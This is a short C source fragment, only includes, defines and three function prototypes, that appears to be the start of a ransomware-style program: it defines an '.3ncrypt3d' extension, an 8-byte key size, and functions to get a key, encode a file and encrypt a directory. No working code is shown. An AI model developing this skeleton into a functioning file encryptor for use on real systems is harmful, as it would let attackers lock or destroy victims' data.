#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <string.h>
#include <dirent.h>

#define EXT_ENCRYPTED ".3ncrypt3d"
#define EXT_LENGHT 10

#define SIZE_KEY 8

char* get_key(int length);
void encodeFile(FILE *file, int nb);
void encryptDir(char *pathDir);
